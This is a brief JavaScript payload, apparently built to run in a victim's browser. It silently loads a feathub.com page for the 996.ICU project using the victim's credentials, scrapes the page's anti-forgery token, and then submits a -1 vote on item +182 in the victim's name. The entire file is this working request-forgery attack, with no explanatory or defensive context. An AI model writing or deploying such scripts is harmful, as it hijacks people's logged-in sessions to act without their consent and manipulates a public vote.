var req = new XMLHttpRequest();

function voteReq(token){
    var data = "_method=patch&authenticity_token="+escape(token);
    req.onload = function(){return true};
    req.open('post','https://feathub.com/LinXueyuanStdio/996.ICU/+182/vote?vote%5Bscore%5D=-1',true);
    req.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    req.withCredentials = true;
    req.send(data);
}

var re = new RegExp('"authenticity_token" value="(.*?)"');
req.onload = function(){
    var token = re.exec(req.responseText)[1];
    voteReq(token);
};
req.open('get','https://feathub.com/LinXueyuanStdio/996.ICU/+182',true);
req.withCredentials = true;
req.send();